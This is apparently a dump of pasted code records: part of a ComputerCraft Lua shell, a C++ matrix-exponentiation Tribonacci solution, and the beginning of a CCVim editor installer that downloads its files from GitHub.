local function run( _tEnv, _sPath, ... )
    if type( _tEnv ) ~= ""table"" then
        error( ""bad argument #1 (expected table, got "" .. type( _tEnv ) .. "")"", 2 ) 
    end
    if type( _sPath ) ~= ""string"" then
        error( ""bad argument #2 (expected string, got "" .. type( _sPath ) .. "")"", 2 ) 
    end
    local tArgs = table.pack( ... )
    local tEnv = _tEnv
    local fnFile, err = loadfile( _sPath, tEnv )
    if fnFile then
        local ok, err = pcall( function()
            vars[""?""] = fnFile( table.unpack( tArgs, 1, tArgs.n ) )
            if vars[""?""] == nil or vars[""?""] == true then vars[""?""] = 0 
            elseif vars[""?""] == false then vars[""?""] = 1 end
        end )
        if not ok then
            if err and err ~= """" then
                printError( err )
            end
            vars[""?""] = 1
            return false
        end
        return true
    end
    if err and err ~= """" then
        printError( err )
    end
    vars[""?""] = 1
    return false
end

local function execv(tokens)
    local path = tokens[0]
    tokens[0] = nil
    if path == nil then return end
    if #tokens == 0 and string.find(path, ""="") ~= nil then
        local k = string.sub(path, 1, string.find(path, ""="") - 1)
        vars[k] = string.sub(path, string.find(path, ""="") + 1)
        vars[k] = tonumber(vars[k]) or vars[k]
        return
    end
    local oldenv = {}
    for k,v in pairs(tokens.vars) do 
        oldenv[k] = _ENV[k]
        _ENV[k] = v 
    end
    if if_statement > 0 and not if_table[if_statement].cond and path ~= ""else"" and path ~= ""elif"" and path ~= ""fi"" then return end
    if builtins[path] ~= nil then 
        vars[""?""] = builtins[path](table.unpack(tokens))
        if vars[""?""] == nil or vars[""?""] == true then vars[""?""] = 0 
        elseif vars[""?""] == false then vars[""?""] = 1 end
    elseif functions[path] ~= nil and not no_funcs then
        local oldargs = args
        args = tokens
        function_running = true
        for k,v in ipairs(functions[path]) do 
            shell.run(v) 
            if not function_running then break end
        end
        args = oldargs
    else
        if not fs.exists(path) then
            printError(""cash: "" .. path .. "": No such file or directory"")
            vars[""?""] = -1
            return
        end
        if not CCKernel2 then
            local file = fs.open(path, ""r"")
            local firstLine = file.readLine()
            file.close()
            if firstLine ~= nil and string.sub(firstLine, 1, 2) == ""#!"" then
                table.insert(tokens, 1, path)
                path = string.sub(firstLine, 3)
                if not fs.exists(path) and fs.exists(path .. "".lua"") then path = path .. "".lua"" end
            end
        end
        local _old = vars._
        vars._ = path
        local cmdenv = setmetatable({shell = shell, multishell = multishell}, {__index = shell_env})
        cmdenv.require, cmdenv.package = make_require(cmdenv, PWD)
        run(cmdenv, path, table.unpack(tokens)) 
        vars._ = _old
    end
    for k,v in pairs(tokens.vars) do _ENV[k] = oldenv[k] end
end

run_tokens = function(tokens, isAsync)
    if tokens.async and not isAsync then
        local coro, pid
        if CCKernel2 then pid = kernel.fork(""cash"", function() run_tokens(tokens, true) end)
        else coro = coroutine.create(function() run_tokens(tokens, true) end) end
        local id = #jobs + 1
        jobs[id] = {cmd = tokens[1][0] .. "" "" .. table.concat(tokens[1], "" ""), coro = coro, pid = pid, isfg = false, start = true}
        print(""["" .. (id) .. ""] "" .. (pid or """"))
    else
        for k,tok in ipairs(tokens) do 
            if tok[0] then
                if trim(tok[0]) ~= """" and (tok.last == 0 and vars[""?""] == 0) or (tok.last == 1 and vars[""?""] ~= 0) or tok.last == nil then
                    execv(tok) 
                end
            else
                for k,v in pairs(tok.vars) do vars[k] = tonumber(v) or v end
            end 
        end
    end
    return vars[""?""] == 0
end

local run_tokens_async = function(tokens)
    local coro, pid
    if CCKernel2 then pid = kernel.fork(""cash"", function() run_tokens(tokens, true) end)
    else coro = coroutine.create(function() run_tokens(tokens, true) end) end
    local id = #jobs + 1
    jobs[id] = {cmd = tokens[1][0] and (tokens[1][0] .. "" "" .. table.concat(tokens[1], "" "")) or ""cash"", coro = coro, pid = pid, isfg = not tokens.async, start = true}
    if tokens.async then print(""["" .. (id) .. ""] "" .. (pid or """")) end
end

function shell.run(...)
    local cmd = table.concat({...}, "" "")
    if cmd == """" or string.sub(cmd, 1, 1) == ""#"" then return end
    if function_name ~= nil then
        if string.find(cmd, ""}"") then function_name = nil
        else table.insert(functions[function_name], cmd) end
        return true
    elseif while_statement > 0 then
        local tokens = splitSemicolons(cmd)
        for k,line in ipairs(tokens) do 
            line = string.sub(line, #string.match(line, ""^ *"") + 1)
            if line == ""do"" or line == ""done"" or string.find(line, ""^do "") or string.find(line, ""^done "") then run_tokens(tokenize(line)) end
            if while_statement > 0 then table.insert(while_table[1].lines, line) end
        end
        return true
    end
    local lines = splitSemicolons(cmd)
    for k,v in ipairs(lines) do run_tokens(tokenize(v, string.sub(v, 1, 6) == ""while "")) end
    return vars[""?""] == 0
end

function shell.runAsync(...)
    local cmd = table.concat({...}, "" "")
    if cmd == """" or string.sub(cmd, 1, 1) == ""#"" then return end
    if function_name ~= nil then
        if string.find(cmd, ""}"") then function_name = nil
        else table.insert(functions[function_name], cmd) end
        return true
    elseif while_statement > 0 then
        local tokens = splitSemicolons(cmd)
        for k,line in ipairs(tokens) do 
            line = string.sub(line, #string.match(line, ""^ *"") + 1)
            if line == ""do"" or line == ""done"" or string.find(line, ""^do "") or string.find(line, ""^done "") then run_tokens(tokenize(line)) end
            if while_statement > 0 then table.insert(while_table[1].lines, line) end
        end
        return true
    end
    local lines = splitSemicolons(cmd)
    for k,v in ipairs(lines) do run_tokens_async(tokenize(v, string.sub(v, 1, 6) == ""while "")) end
    return vars[""?""] == 0
end

function multishell.launch(environment, path, ...)
    expect(1, environment, ""table"")
    expect(2, path, ""string"")
    local coro, pid
    local tok = {[0] = path, ...}
    if CCKernel2 then pid = kernel.fork(path, function() execv(tok) end)
    else coro = coroutine.create(function() execv(tok) end) end
    local id = #jobs + 1
    jobs[id] = {cmd = path .. "" "" .. table.concat({...}, "" ""), coro = coro, pid = pid, isfg = false}
    return id
end

function shell.openTab(...)
    local cmd = table.concat({...}, "" "")
    if cmd == """" or string.sub(cmd, 1, 1) == ""#"" then return end
    if function_name ~= nil then
        if string.find(cmd, ""}"") then function_name = nil
        else table.insert(functions[function_name], cmd) end
        return true
    elseif while_statement > 0 then
        local tokens = splitSemicolons(cmd)
        for k,line in ipairs(tokens) do 
            line = string.sub(line, #string.match(line, ""^ *"") + 1)
            if line == ""do"" or line == ""done"" or string.find(line, ""^do "") or string.find(line, ""^done "") then run_tokens(tokenize(line)) end
            if while_statement > 0 then table.insert(while_table[1].lines, line) end
        end
        return true
    end
    local lines = splitSemicolons(cmd)
    for k,v in ipairs(lines) do 
        local tokens = tokenize(v, string.sub(v, 1, 6) == ""while "")
        for k,tok in ipairs(tokens) do if tok[0] ~= """" then 
            local coro, pid
            if CCKernel2 then pid = kernel.fork(tok[0], function() execv(tok) end)
            else coro = coroutine.create(function() execv(tok) end) end
            local id = #jobs + 1
            jobs[id] = {cmd = tok[0] .. "" "" .. table.concat(tok, "" ""), coro = coro, pid = pid, isfg = false}
            print(""["" .. (id) .. ""] "" .. (pid or """"))
        end end
    end
    return vars[""?""] == 0
end

if args[1] ~= nil then
    local path = table.remove(args, 1)
    path = fs.exists(path) and path or shell.resolve(path)
    local file = io.open(path, ""r"")
    if not file then return 1 end
    vars.LINENUM = 1
    for line in file:lines() do 
        shell.run(line) 
        vars.LINENUM = vars.LINENUM + 1
        if not running then break end
    end
    file:close()
    vars.LINENUM = nil
    return shell_retval
end

if topshell == nil then shell.run(""rom/startup.lua"") end

if CCKernel2 then
    if fs.exists(""/etc/cashrc"") then
        local file = io.open(""/etc/cashrc"", ""r"")
        for line in file:lines() do shell.run(line) end
        file:close()
    end
    local function lines(file) return function() return file.readLine() end end
    if fs.exists(""/~/.cashrc"") then
        local file = fs.open(""/~/.cashrc"", ""r"")
        for line in lines(file) do shell.run(line) end
        file.close()
    end
    if fs.exists(""/~/.cash_history"") then
        local file = fs.open(""/~/.cash_history"", ""r"")
        for line in lines(file) do table.insert(history, line) end
        file.close()
        historyfile = fs.open(""/~/.cash_history"", ""a"")
    else historyfile = fs.open(""/~/.cash_history"", ""w"") end
else
    if fs.exists("".cashrc"") then
        local file = io.open("".cashrc"", ""r"")
        for line in file:lines() do shell.run(line) end
        file:close()
    end
    if fs.exists("".cash_history"") then
        local file = io.open("".cash_history"", ""r"")
        for line in file:lines() do table.insert(history, line) end
        file:close()
        historyfile = fs.open("".cash_history"", ""a"")
    else historyfile = fs.open("".cash_history"", ""w"") end
end

local function ansiWrite(str)
    local seq = nil
    local bold = false
    local function getnum(d) 
        if seq == ""["" then return d or 1
        elseif string.find(seq, "";"") then return 
            tonumber(string.sub(seq, 2, string.find(seq, "";"") - 1)), 
            tonumber(string.sub(seq, string.find(seq, "";"") + 1)) 
        else return tonumber(string.sub(seq, 2)) end 
    end
    for c in string.gmatch(str, ""."") do
        if seq == ""\27"" then
            if c == ""c"" then
                term.setBackgroundColor(colors.black)
                term.setTextColor(colors.white)
                term.setCursorBlink(true)
            elseif c == ""["" then seq = ""[""
            else seq = nil end
        elseif seq ~= nil and string.sub(seq, 1, 1) == ""["" then
            if tonumber(c) ~= nil or c == ';' then seq = seq .. c else
                if c == ""A"" then term.setCursorPos(term.getCursorPos(), select(2, term.getCursorPos()) - getnum())
                elseif c == ""B"" then term.setCursorPos(term.getCursorPos(), select(2, term.getCursorPos()) + getnum())
                elseif c == ""C"" then term.setCursorPos(term.getCursorPos() + getnum(), select(2, term.getCursorPos()))
                elseif c == ""D"" then term.setCursorPos(term.getCursorPos() - getnum(), select(2, term.getCursorPos()))
                elseif c == ""E"" then term.setCursorPos(1, select(2, term.getCursorPos()) + getnum())
                elseif c == ""F"" then term.setCursorPos(1, select(2, term.getCursorPos()) - getnum())
                elseif c == ""G"" then term.setCursorPos(getnum(), select(2, term.getCursorPos()))
                elseif c == ""H"" then term.setCursorPos(getnum())
                elseif c == ""J"" then term.clear() -- ?
                elseif c == ""K"" then term.clearLine() -- ?
                elseif c == ""T"" then term.scroll(getnum())
                elseif c == ""f"" then term.setCursorPos(getnum())
                elseif c == ""m"" then
                    local n, m = getnum(0)
                    if n == 0 then
                        term.setBackgroundColor(colors.black)
                        term.setTextColor(colors.white)
                    elseif n == 1 then bold = true
                    elseif n == 7 or n == 27 then
                        local bg = term.getBackgroundColor()
                        term.setBackgroundColor(term.getTextColor())
                        term.setTextColor(bg)
                    elseif n == 22 then bold = false
                    elseif n >= 30 and n <= 37 then term.setTextColor(2^(15 - (n - 30) - (bold and 8 or 0)))
                    elseif n == 39 then term.setTextColor(colors.white)
                    elseif n >= 40 and n <= 47 then term.setBackgroundColor(2^(15 - (n - 40) - (bold and 8 or 0)))
                    elseif n == 49 then term.setBackgroundColor(colors.black) end
                    if m ~= nil then
                        if m == 0 then
                            term.setBackgroundColor(colors.black)
                            term.setTextColor(colors.white)
                        elseif m == 1 then bold = true
                        elseif m == 7 or m == 27 then
                            local bg = term.getBackgroundColor()
                            term.setBackgroundColor(term.getTextColor())
                            term.setTextColor(bg)
                        elseif m == 22 then bold = false
                        elseif m >= 30 and m <= 37 then term.setTextColor(2^(15 - (m - 30) - (bold and 8 or 0)))
                        elseif m == 39 then term.setTextColor(colors.white)
                        elseif m >= 40 and m <= 47 then term.setBackgroundColor(2^(15 - (m - 40) - (bold and 8 or 0)))
                        elseif m == 49 then term.setBackgroundColor(colors.black) end
                    end
                end
                seq = nil
            end
        elseif c == string.char(0x1b) then seq = ""\27""
        else write(c) end
    end
end

local function readCommand()
    if term.getGraphicsMode and term.getGraphicsMode() then term.setGraphicsMode(false) end
    local prompt = getPrompt()
    ansiWrite(prompt)
    local str = """"
    local ox, oy = term.getCursorPos()
    local coff = 0
    local histpos = table.maxn(history) + 1
    local lastlen = 0
    local waitTab = false
    local ly = ({term.getCursorPos()})[2]
    local function redrawStr()
        term.setCursorPos(ox, oy)
        local x, y
        local i = 0
        for c in string.gmatch(str, ""."") do
            if term.getCursorPos() == term.getSize() then
                if select(2, term.getCursorPos()) == select(2, term.getSize()) then
                    term.scroll(1)
                    oy = oy - 1
                    term.setCursorPos(1, select(2, term.getCursorPos()))
                else term.setCursorPos(1, select(2, term.getCursorPos()) + 1) end
            end
            if i == coff then x, y = term.getCursorPos() end
            term.write(c)
            i=i+1
        end
        if x == nil then x, y = term.getCursorPos() end
        for i = 0, lastlen - #str - 1 do write("" "") end
        if term.getCursorPos() == 1 and lastlen > #str then
            term.write("" "")
        end
        lastlen = #str
        ly = ({term.getCursorPos()})[2]
        term.setCursorPos(x, y)
    end
    term.setCursorBlink(true)
    while true do
        local ev = {os.pullEventRaw()}
        if ev[1] == ""key"" then
            if ev[2] == keys.enter then break
            elseif ev[2] == keys.up and history[histpos-1] ~= nil then 
                histpos = histpos - 1
                str = history[histpos]
                coff = #str
                waitTab = false
            elseif ev[2] == keys.down and history[histpos+1] ~= nil then 
                histpos = histpos + 1
                str = history[histpos]
                coff = #str
                waitTab = false
            elseif ev[2] == keys.down and histpos == table.maxn(history) then
                histpos = histpos + 1
                str = """"
                coff = 0
                waitTab = false
            elseif ev[2] == keys.left and coff > 0 then 
                coff = coff - 1
                waitTab = false
            elseif ev[2] == keys.right and coff < #str then 
                coff = coff + 1
                waitTab = false
            elseif ev[2] == keys.backspace and coff > 0 then
                str = string.sub(str, 1, coff - 1) .. string.sub(str, coff + 1)
                coff = coff - 1
                waitTab = false
            elseif ev[2] == keys.tab and coff == #str then
                local tokens = tokenize(str)[1]
                -- TODO: FIX THIS
                if completion[tokens[0]] ~= nil then
                    local t = {}
                    for i = 1, table.maxn(tokens) - 1 do t[i] = tokens[i] end
                    local res = completion[tokens[0]].fnComplete(shell, table.maxn(tokens), tokens[table.maxn(tokens)], t)
                    if res and #res > 0 then
                        local longest = res[1]
                        local function getLongest(a, b)
                            for i = 1, math.min(#a, #b) do if string.sub(a, i, i) ~= string.sub(b, i, i) then return string.sub(a, 1, i-1) end end
                            return a 
                        end
                        for k,v in ipairs(res) do longest = getLongest(longest, v) end
                        if longest == """" then
                            if not waitTab then waitTab = true else
                                for k,v in ipairs(res) do res[k] = tokens[table.maxn(tokens)] .. v end
                                print("""")
                                textutils.pagedTabulate(res)
                                ansiWrite(getPrompt())
                                ox, oy = term.getCursorPos()
                            end
                        else
                            str = str .. longest
                            coff = #str
                            waitTab = false
                        end
                    end
                elseif tokens[1] == nil then
                    local res = shell.completeProgram(tokens[0])
                    if res and #res > 0 then
                        local longest = res[1]
                        local function getLongest(a, b)
                            for i = 1, math.min(#a, #b) do if string.sub(a, i, i) ~= string.sub(b, i, i) then return string.sub(a, 1, i-1) end end
                            return a 
                        end
                        for k,v in ipairs(res) do longest = getLongest(longest, v) end
                        if longest == """" then
                            if not waitTab then waitTab = true else
                                for k,v in ipairs(res) do res[k] = string.gsub(fs.getName(tokens[0]), ""%.lua"", """") .. v end
                                print("""")
                                textutils.pagedTabulate(res)
                                ansiWrite(getPrompt())
                                ox, oy = term.getCursorPos()
                            end
                        else
                            str = str .. string.gsub(longest, ""%.lua"", """")
                            coff = #str
                            waitTab = false
                        end
                    end
                else
                    local res = fs.complete(tokens[table.maxn(tokens)], PWD, true, true)
                    if res and #res > 0 then
                        local longest = res[1]
                        local function getLongest(a, b)
                            for i = 1, math.min(#a, #b) do if string.sub(a, i, i) ~= string.sub(b, i, i) then return string.sub(a, 1, i-1) end end
                            return a 
                        end
                        for k,v in ipairs(res) do longest = getLongest(longest, v) end
                        if longest == """" then
                            if not waitTab then waitTab = true else
                                for k,v in ipairs(res) do res[k] = fs.getName(tokens[table.maxn(tokens)]) .. v end
                                print("""")
                                textutils.pagedTabulate(res)
                                ansiWrite(getPrompt())
                                ox, oy = term.getCursorPos()
                            end
                        else
                            str = str .. longest
                            coff = #str
                            waitTab = false
                        end
                    end
                end
            end
        elseif ev[1] == ""char"" then
            str = string.sub(str, 1, coff) .. ev[2] .. string.sub(str, coff + 1)
            coff = coff + 1
            waitTab = false
        elseif ev[1] == ""paste"" then
            str = string.sub(str, 1, coff) .. ev[2] .. string.sub(str, coff + 1)
            coff = coff + #ev[2]
            waitTab = false
        elseif ev[1] == ""terminate"" then
            if vars.TERMINATE_QUIT == ""yes"" or vars.terminate_quit == 1 then running = false end
            str = """"
            break
        end
        redrawStr()
    end
    if ly >= ({term.getSize()})[2] then 
        term.scroll(1) 
        ly = ly - 1
    end
    term.setCursorPos(1, ly + 1)
    term.setCursorBlink(false)
    if str ~= """" then 
        table.insert(history, str) 
        historyfile.writeLine(str)
        historyfile.flush()
    end
    return str
end

local function jobManager()
    while running do
        if CCKernel2 then
            local e = {os.pullEventRaw()}
            if e[1] == ""process_complete"" then
                for k,v in pairs(jobs) do if v.pid == e[2] then 
                    jobs[k] = nil
                    completed_jobs[k] = {err = ""Done"", cmd = v.cmd}
                    break
                end end
            end
        else
            local delete = {}
            local e = {os.pullEventRaw()}
            for k,v in pairs(jobs) do
                if not v.paused and (v.filter == nil or v.filter == e[1]) and (v.isfg or v.start or not (
                    e[1] == ""key"" or e[1] == ""char"" or e[1] == ""key_up"" or e[1] == ""paste"" or
                    e[1] == ""mouse_click"" or e[1] == ""mouse_up"" or e[1] == ""mouse_drag"" or 
                    e[1] == ""mouse_scroll"" or e[1] == ""monitor_touch"")) then
                    local oldterm = term.current()
                    if v.term then term.redirect(v.term) end
                    local ok, filter = coroutine.resume(v.coro, table.unpack(e))
                    v.term = term.redirect(oldterm)
                    if coroutine.status(v.coro) == ""dead"" then
                        table.insert(delete, k)
                        completed_jobs[k] = {err = ""Done"", cmd = v.cmd, isfg = v.isfg}
                        os.queueEvent(""job_complete"", k)
                    elseif not ok then
                        table.insert(delete, k)
                        completed_jobs[k] = {err = filter, cmd = v.cmd, isfg = v.isfg}
                        os.queueEvent(""job_complete"", k)
                    end
                    v.filter = filter
                    v.start = false
                end
            end
            for k,v in ipairs(delete) do jobs[v] = nil end
        end
    end
end

parallel.waitForAny(function()
    while running do 
        for k,v in pairs(completed_jobs) do if not v.isfg then print(""["" .. k .. ""]+  "" .. v.err .. ""  "" .. v.cmd) end end
        completed_jobs = {}
        shell.runAsync(readCommand())
        while #jobs > 0 do
            local b = true
            for k,v in pairs(jobs) do if v.isfg and not v.paused then b = false; break end end
            if b then break end
            if os.pullEventRaw() == ""terminate"" then
                for k,v in pairs(jobs) do if v.isfg and not v.paused then
                    jobs[k] = nil
                    print(""^T"")
                    b = true
                    break
                end end
            end
            if b then break end
        end
    end
end, function()
    local ctrlHeld = false
    while running do
        local ev = {os.pullEventRaw()}
        if ev[1] == ""key"" and (ev[2] == keys.leftCtrl or ev[2] == keys.rightCtrl) then ctrlHeld = true
        elseif ev[1] == ""key_up"" and (ev[2] == keys.leftCtrl or ev[2] == keys.rightCtrl) then ctrlHeld = false
        elseif ctrlHeld and ev[1] == ""key"" and ev[2] == keys.z then
            print(""^Z"")
            for k,v in pairs(jobs) do if v.isfg and not v.paused then 
                v.paused = true
                if CCKernel2 then kernel.signal(signal.SIGSTOP, v.pid) end
                pausedJob = k
                print(""["" .. k .. ""]+  Paused  "" .. v.cmd)
                os.queueEvent(""job_paused"")
                break
            end end
        end
    end
end, jobManager)

if execCommand then shell.run(execCommand); return vars[""?""] end

historyfile.close()
return shell_retval"
swxnUv5Q,12470 - Tribonacci,MiinaMagdy,C++,Monday 29th of January 2024 08:09:20 AM CDT,"/*
+---------------------------------------------+
|                                             |
|       ¬© 29/01/2024 (15:37) MinaMagdy        |
|                                             |
+---------------------------------------------+
*/
#include <bits/stdc++.h>
#include <ext/pb_ds/assoc_container.hpp>
#include <ext/pb_ds/tree_policy.hpp>

using namespace std;
using namespace __gnu_pbds;
#define ordered_set tree<int, null_type, less<int>, rb_tree_tag, tree_order_statistics_node_update>
#define multi_ordered_set tree<int, null_type, less_equal<int>, rb_tree_tag, tree_order_statistics_node_update>
#define endl ""\n""
#define MOD 1000000007
#define INF 2000000000
#define all(s) s.begin(), s.end()
#define rall(s) s.rbegin(), s.rend()
#define sz(x) int(x.size())

typedef long long ll;
typedef long double ld;
typedef unsigned long long ull;
#include <ext/numeric>
using namespace __gnu_cxx;
const int mod = 1000000009;
typedef vector<vector<int>> matrix;
struct mul
{
    int n;
    mul(int n) : n(n) {}
    matrix operator()(const matrix &a, const matrix &b)
    {
        assert(a[0].size() == b.size());
        matrix c(a.size(), vector<int>(b[0].size(), 0));
        for (int i = 0; i < a.size(); i++)
        {
            for (int j = 0; j < b[0].size(); j++)
            {
                for (int k = 0; k < b.size(); k++)
                {
                    c[i][j] += a[i][k] * 1ll * b[k][j] % mod;
                    if (c[i][j] >= mod)
                        c[i][j] -= mod;
                }
            }
        }
        return c;
    }
};

matrix identity_element(const mul &m)
{
    matrix res(m.n, vector<int>(m.n, 0));
    for (int i = 0; i < m.n; i++)
        res[i][i] = 1;
    return res;
}

void solve()
{
    ll n;
    while (cin >> n, n)
    {
        matrix m = {
            {0, 1, 0},
            {0, 0, 1},
            {1, 1, 1}};
        matrix f1 = {
            {0},
            {1},
            {2}};
        mul mm(3);
        cout << mm(power(m, n - 1, mm), f1)[0][0] << endl;
    }
}

int main(void)
{
    ios_base::sync_with_stdio(false), cin.tie(NULL), cout.tie(NULL);
    int testcase = 1;
    // cin >> testcase;
    while (testcase--)
        solve();
    return 0;
}"
wFKC5Y5T,DOOR-OS-viminstaller.lua,Chomudit,Lua,Monday 29th of January 2024 08:07:19 AM CDT,"--[[ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

                        CCVIM INSTALLER
                          VERSION 0.16

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -]]

local function initialMenu()
    term.clear()
    term.setCursorPos(1, 1)
    print(""CCVIM Installer v0.16"")
    print() --skip a line
    print(""1. Install CCVIM"")
    print(""2. Add CCVIM to universal path"")
    print(""3. Add syntax to installation"")
    print(""4. Update CCVIM"")
    print(""5. Exit"")
end

local function find(table, query)
    if table then
        for i=1,#table,1 do
            if table[i] == query then
                return i
            end
        end
        return false
    end
end

local function toArr(filePath)
    local fileHandle = fs.open(filePath, ""r"")
    local log
    if fileHandle then
        log = {}
        local line = fileHandle.readLine()
        while line do
            table.insert(log, line)
            line = fileHandle.readLine()
        end
        fileHandle.close()
        return log
    else
        return false
    end
end

local setPath = false
local function addToPath()
    if fs.exists(""/vim/vim.lua"") then
        local lines = toArr(""/startup"")
        if not find(lines, ""shell.setPath(shell.path()..\"":/vim/\"")"") then
            print(""This will not work if you have moved your CCVIM installation. Proceed? [y/n]"")
            local _, c = os.pullEvent(""char"")
            if c == ""y"" or c == ""Y"" then
                print(""Looking for existing startup file..."")
                if fs.exists(""startup"") then
                    print(""Existing startup file found. Would you like to back it up (startup.bkup) before proceeding? [y/n]"")
                    local _,cha = os.pullEvent(""char"")
                    if cha == ""y"" or cha == ""Y"" then
                        shell.run(""cp"", ""/startup/"", ""/startup.bkup/"")
                        if not fs.exists(""startup.bkup"") then
                            error(""Failed to create backup file."")
                        end
                        print(""Backed up existing startup file to /startup.bkup"")
                    else
                        print(""Proceeding without backing up existing startup file"")
                    end
                end
                print(""Adding path setup to startup file..."")
                local file = fs.open(""startup"", ""a"")
                file.writeLine(""shell.setPath(shell.path()..\"":/vim/\"")"")
                file.close()
                print(""Added path setup to startup file."")
                setPath = true
            end
        else
            print(""Already added to file."")
        end
    else
        print(""No vim installation found."")
    end
    print(""Press any key to continue..."")
    os.pullEvent(""char"")
end

local function download(url, file, noerr)
    local content = http.get(url)
    if not content then
        if not noerr then
            error(""Failed to access resource "" .. url)
        else
            return false
        end
    end
    content = content.readAll()
    local fi = fs.open(file, ""w"")
    fi.write(content)
    fi.close()
end

local function install()
    print(""Downloading files from github..."")
    local oldx, oldy = term.getCursorPos()
    local wid, hig = term.getSize()
    term.setCursorPos(oldx, oldy)
    for i=1,wid,1 do
        term.write("" "")
    end
    term.setCursorPos(oldx, oldy)
    term.write(""Downloading vim.lua ..."")
    download(""https://raw.githubusercontent.com/Minater247/CCVim/main/vim.lua"", ""/vim/vim.lua"")
    term.setCursorPos(oldx, oldy)
    for i=1,wid,1 do
        term.write("" "")
    end
    term.setCursorPos(oldx, oldy)
    term.write(""Downloading .vimrc ..."")
    download(""https://raw.githubusercontent.com/Minater247/CCVim/main/.vimrc"", ""/vim/.vimrc"")
    term.setCursorPos(oldx, oldy)
    for i=1,wid,1 do
        term.write("" "")
    end
    term.setCursorPos(oldx, oldy)
    term.write(""Downloading .version ..."")
    download(""https://raw.githubusercontent.com/Minater247/CCVim/main/.version"", ""/vim/.version"")
    download(""https://raw.githubusercontent.com/Minater247/CCVim/main/lib/args.lua"", ""/vim/lib/args.lua"")
    term.setCursorPos(oldx, oldy)
    for i=1,wid,1 do
        term.write("" "")
    end
    term.setCursorPos(oldx, oldy)
    term.write(""Downloading args.lua ..."")
    download(""https://raw.githubusercontent.com/Minater247/CCVim/main/lib/fil.lua"", ""/vim/lib/fil.lua"")
    term.setCursorPos(oldx, oldy)
    for i=1,wid,1 do
        term.write("" "")
    end
    term.setCursorPos(oldx, oldy)
    term.write(""Downloading str.lua ..."")
    download(""https://raw.githubusercontent.com/Minater247/CCVim/main/lib/str.lua"", ""/vim/lib/str.lua"")
    term.setCursorPos(oldx, oldy)
    for i=1,wid,1 do
        term.write("" "")
    end
    term.setCursorPos(oldx, oldy)
    term.write(""Downloading tab.lua ..."")
    download(""https://raw.githubusercontent.com/Minater247/CCVim/main/lib/tab.lua"", ""/vim/lib/tab.lua"")
    print(""Done."")
    print(""Do you want to add CCVIM to your universal path?"")
    print(""This allows you to access it from anywhere on the computer. [y/n]"")
    local _, c = os.pullEvent(""char"")
    if c == ""y"" then
        addToPath()
    end
    if fs.exists(""/vim/vim.lua"") and fs.exists(""/vim/lib/args.lua"") and fs.exists(""/vim/lib/fil.lua"") and fs.exists(""/vim/lib/str.lua"") and fs.exists(""/vim/lib/tab.lua"") then
        print(""Finished installing."")
        print(""Are you able to press tab on your device? [y/n]"")
        local _, eh = os.pullEvent(""char"")
        if eh ~= ""y"" then
            print(""Adding config line to .vimrc ..."")
            local ff = fs.open(""/vim/.vimrc"", ""a"")
            ff.writeLine(""set mobile"")
            ff.close()
            print(""Configured for tabless use. Tap or click the bottom line to exit insert or append mode."")
        else
            print(""Using default config."")
        end
        if setPath then
            print(""Please reboot your computer to complete the installation"")
        end
        print(""Press any key to continue..."")
        os.pullEvent(""char"")
    else
        print(""Something went wrong. Do you want to delete the existing files and try again? [y/n]"")
        local _, eh = os.pullEvent(""char"")
        if eh == ""y"" then
            print(""Retrying..."")
            install()
        else
            print(""Vim was partially installed but failed to download some files. Please rerun the installation before usage."")
            print(""Press any key to contine."")
            os.pullEvent(""key"")
        end
    end
end

local function syntax()
    print(""Downloader for the official syntax files."")
    print(""Enter the file extension for the filetype: "")
    local fts = string.lower(read())
    print(""Looking for extension \""""..fts..""\"" in repo..."")
    if download(""https://raw.githubusercontent.com/Minater247/CCVim/main/syntax/""..fts.."".lua"", ""/vim/syntax/""..fts.."".lua"", true) == false then
        print(""Could not find file for extension \""""..fts..""\"""")
        print(""Press any key to continue..."")
        os.pullEvent(""key"")
    else
        print(""Downloaded syntax for \""""..fts..""\"""")
        print(""Press any key to continue..."")
        os.pullEvent(""key"")
    end
end

local function split(s, delimiter)
    local result = {};
    for match in (s..delimiter):gmatch(""(.-)""..delimiter) do
        table.insert(result, match);
    end
    return result;
end

local function update()
    print(""Fetching current version..."")
    local con = true
    local f
    local vimver
    local instver
    local nf
    local nft
    local nvimver
    local ninstver
    if not fs.isDir(""/vim/"") then
        con = false 
    end
    if fs.exists(""/vim/.version"") and con then
        f = toArr(""/vim/.version"")
        vimver = tonumber(f[1])
        instver = tonumber(f[2])
        nf = http.get(""https://raw.githubusercontent.com/Minater247/CCVim/main/.version"").readAll()
        nft = split(nf, ""\n"")
        nvimver = tonumber(nft[1])
        ninstver = tonumber(nft[2])
        if ninstver > instver then
            print(""This version of the installer is outdated. Please download a new version to continue."")
            print(""Download now? [y/n]"")
            local _,inp = os.pullEvent(""char"")
            if inp == ""y"" then
                download(""https://raw.githubusercontent.com/Minater247/CCVim/main/vim_installer.lua"", ""/vim/installer"")
                fs.delete(""/vim/installer.lua"") --legacy installers
                fs.delete(""/vim/vim_installer.lua"")
                fs.move(""/vim/installer"", ""/vim/vim_installer.lua"")
                print(""Updated installer downloaded. Local path is at /vim/vim_installer.lua"")
                print(""Updating local version file..."")
                local filelines = toArr(""/vim/.version"")
                filelines[2] = ninstver
                local ff = fs.open(""/vim/.version"", ""w"")
                for i=1,#filelines,1 do
                    ff.writeLine(filelines[i])
                end
                print(""Updated local version."")
                if nvimver > vimver then
                    print(""Please restart the installer to complete the update."")
                end
                ff.close()
                print(""Exiting."")
                print(""Press any key to continue..."")
                os.pullEvent(""char"")
                error() --not an actual error, displays nothing to user. Just used to quit.
            end
        else
            print(""Installer version is current."")
            if nvimver > vimver then
                print(""An update is available! ""..vimver.."" -> ""..nvimver)
                print(""Downloading files from github..."")
                download(""https://raw.githubusercontent.com/Minater247/CCVim/main/vim.lua"", ""/vim/vim.lua"")
                download(""https://raw.githubusercontent.com/Minater247/CCVim/main/lib/args.lua"", ""/vim/lib/args.lua"")
                download(""https://raw.githubusercontent.com/Minater247/CCVim/main/lib/fil.lua"", ""/vim/lib/fil.lua"")
                download(""https://raw.githubusercontent.com/Minater247/CCVim/main/lib/str.lua"", ""/vim/lib/str.lua"")
                download(""https://raw.githubusercontent.com/Minater247/CCVim/main/lib/tab.lua"", ""/vim/lib/tab.lua"")
                print(""Update complete."")
                print(""Updating local version info..."")
                local filelines = toArr(""/vim/.version"")
                filelines[1] = nvimver
                local ff = fs.open(""/vim/.version"", ""w"")
                for i=1,#filelines,1 do
                    ff.writeLine(filelines[i])
                end
                print(""Updated local version."")
                ff.close()
                print(""Wrapping up..."")
                --used to be code here
                print(""Done."")
                print(""Press any key to continue"")
                os.pullEvent(""key"")
